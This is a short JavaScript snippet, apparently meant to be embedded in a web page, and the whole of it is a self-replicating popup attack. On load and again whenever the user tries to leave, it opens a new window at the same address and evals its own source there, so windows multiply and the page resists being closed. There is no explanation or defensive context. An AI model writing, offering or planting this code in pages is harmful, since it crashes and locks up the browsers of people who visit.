(function f() {
  window.onbeforeunload = function() {
    window.open(window.location.href).eval(`(${f})()`);
    return ""; 
  };
  window.onload = function() {
    setTimeout(function() {
      window.open(window.location.href).eval(`(${f})()`);
    }, 0);
  };
  window.onload();
})();
